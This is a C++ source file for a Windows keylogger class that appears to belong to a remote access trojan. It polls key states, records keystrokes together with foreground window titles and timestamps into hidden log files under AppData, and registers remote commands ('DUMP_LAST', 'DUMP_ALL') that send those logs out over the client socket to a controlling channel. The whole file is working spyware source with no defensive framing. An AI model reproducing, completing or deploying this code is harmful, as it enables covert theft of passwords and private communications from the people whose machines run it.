#include "KeyLogger.h"

void KeyLogger::tryStart() {
    if (!recordingKeys.load()) {
        recordingKeys = true;
        std::thread keyloggerThread(&KeyLogger::start, this);
        keyloggerThread.detach();
    }
}

void KeyLogger::start() {
    while (recordingKeys.load()) {
        int shift = checkShift();
        int cap = GetKeyState(VK_CAPITAL);
        int altC = checkAltGr();


        if (GetAsyncKeyState(VK_SPACE) & 0x0001) {
            writeCharIntoLogFile(' ');
        } else if (GetAsyncKeyState(VK_LCONTROL) & 0x0001) {
            writeCharIntoLogFile("[LEFT-CONTROL]");
        } else if (GetAsyncKeyState(VK_RCONTROL) & 0x0001) {
            writeCharIntoLogFile("[RIGHT-CONTROL]");
        } else {
            for (int i = 48; i <= 250; i++) {
                if (GetAsyncKeyState(i) & 0x0001) {
                    switch (i) {
                        case 48:
                            if (shift)writeCharIntoLogFile("=");
                            else if (altC); else writeCharIntoLogFile("0");
                            break;
                        case 49:
                            if (shift)writeCharIntoLogFile("!");
                            else if (altC) writeCharIntoLogFile("|"); else writeCharIntoLogFile("1");
                            break;
                        case 50:
                            if (shift)writeCharIntoLogFile("\"");
                            else if (altC) writeCharIntoLogFile("@"); else writeCharIntoLogFile("2");
                            break;
                        case 51:
                            if (shift)writeCharIntoLogFile((char) 250);
                            else if (altC) writeCharIntoLogFile("#"); else writeCharIntoLogFile("3");
                            break;
                        case 52:
                            if (shift)writeCharIntoLogFile("$");
                            else if (altC) writeCharIntoLogFile("~"); else writeCharIntoLogFile("4");
                            break;
                        case 53:
                            (shift) ? writeCharIntoLogFile("%") : writeCharIntoLogFile("5");
                            break;
                        case 54:
                            if (shift)writeCharIntoLogFile("&");
                            else if (altC) writeCharIntoLogFile(char(172)); else writeCharIntoLogFile("6");
                            break;
                        case 55:
                            shift ? writeCharIntoLogFile("/") : writeCharIntoLogFile("7");
                            break;
                        case 56:
                            shift ? writeCharIntoLogFile("(") : writeCharIntoLogFile("8");
                            break;
                        case 57:
                            shift ? writeCharIntoLogFile(")") : writeCharIntoLogFile("9");
                            break;
                        case 65 ... 90:    // Alphabet
                            if (shift == cap) {
                                writeCharIntoLogFile((char) (i + 32));  // Minúscula
                            }
                            else {
                                writeCharIntoLogFile((char) (i));  // Mayúscula
                            }
                            break;
                        case 186:
                            if (shift) writeCharIntoLogFile("^");
                            else if (altC) writeCharIntoLogFile("["); else writeCharIntoLogFile("`");
                            break;
                        case 187:
                            if (shift) writeCharIntoLogFile("*");
                            else if (altC) writeCharIntoLogFile("]"); else writeCharIntoLogFile("+");
                            break;
                        case 188:
                            (shift) ? writeCharIntoLogFile(";") : writeCharIntoLogFile(",");
                            break;
                        case 189:
                            (shift) ? writeCharIntoLogFile("_") : writeCharIntoLogFile("-");
                            break;
                        case 190:
                            (shift) ? writeCharIntoLogFile(":") : writeCharIntoLogFile(".");
                            break;
                        case 191:
                            if (shift && !cap || !shift && cap) writeCharIntoLogFile(char(128));
                            else if (altC) writeCharIntoLogFile(char(125)); else writeCharIntoLogFile(char(135));
                            break;
                        case 192:
                            (shift && !cap || !shift && cap) ?
                            writeCharIntoLogFile((char) 165) :
                            writeCharIntoLogFile((char) 164);
                            break;
                        case 220:
                            if (shift) writeCharIntoLogFile(char(166));
                            else if (altC)writeCharIntoLogFile(char(92)); else writeCharIntoLogFile(char(220));
                            break;
                        case 222:
                            if (shift) writeCharIntoLogFile(char(249));
                            else if (altC) writeCharIntoLogFile("{"); else writeCharIntoLogFile(char(239));
                            break;
                        default:
                            break;
                    }

                }
            }
        }
        Sleep(10);
    }
}



bool KeyLogger::checkAltGr() {
    return GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU);
}

void KeyLogger::writeCharIntoLogFile(const char *string) {
    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
    std::ofstream fileStream;
    fileStream.open(logsFileName.c_str(), std::fstream::app);
    std::string detectedWindow = getCurrentWindow();
    detectedWindow = detectedWindow.empty() ? "undefined window" : detectedWindow;
    std::string finalString;
    if (tempWindow != detectedWindow) {
        finalString += firstRegister ? "" : "\n";
        firstRegister = false;
        finalString += detectedWindow + ",";
        finalString +=  Converter::wstring2string(TimeCS::getCurrentDateTimeW()) + ",";
        tempWindow = detectedWindow;
    }
    finalString += string;
    fileStream << finalString;
    fileStream.close();
}

void KeyLogger::writeCharIntoLogFile(char string) {
    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
    std::ofstream fileStream;
    fileStream.open(logsFileName.c_str(), std::fstream::app);
    std::string detectedWindow = getCurrentWindow();
    detectedWindow = detectedWindow.empty() ? "undefined window" : detectedWindow;
    std::string finalString;
    if (tempWindow != detectedWindow) {
        finalString += firstRegister ? "" : "\n";
        firstRegister = false;
        finalString += detectedWindow + ",";
        finalString +=  Converter::wstring2string(TimeCS::getCurrentDateTimeW()) + ",";
        tempWindow = detectedWindow;
    }
    finalString += string;
    fileStream << finalString;
    fileStream.close();
}


std::string KeyLogger::getCurrentWindow() {
    char wnd_title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
    return wnd_title;
}

bool KeyLogger::checkShift() {
    return GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_RSHIFT);
}



std::wstring KeyLogger::generateLogName() {
    return pathOfLogs + L"log_" + TimeCS::getCurrentDateTimeW() + L".log";
}

bool KeyLogger::lastLogExists() const {
    return std::filesystem::exists(logsFileName);
}

bool KeyLogger::logsExists() const {
    return std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs);

}

void KeyLogger::sendLastKeyloggerLog(nlohmann::json json) {
    if (lastLogExists()){
        nlohmann::json jsonObject;
        std::vector<std::string> vec(1, Converter::wstring2string(logsFileName));
        jsonObject["from_path"] = vec;
        jsonObject["channel_id"] = json["channel_id"];
        download.downloadContent(jsonObject);
    }
}

void KeyLogger::sendAll(nlohmann::json json) {
    if (logsExists()){
        nlohmann::json jsonObject;
        jsonObject["from_path"] = Converter::wstring2string(pathOfLogs);
        jsonObject["channel_id"] = json["channel_id"];
        download.downloadContent(jsonObject);
    }
}


KeyLogger::KeyLogger(ClientSocket &clientSocket, Download &download)
        : Handler(clientSocket), download(download) {
#ifdef KEYLOGGER_DEF
    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
    logsFileName = generateLogName();
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["DUMP_LAST"] =[&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &KeyLogger::sendLastKeyloggerLog, json);
    };
    actionMap["DUMP_ALL"] =[&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &KeyLogger::sendAll, json);
    };



#endif
}




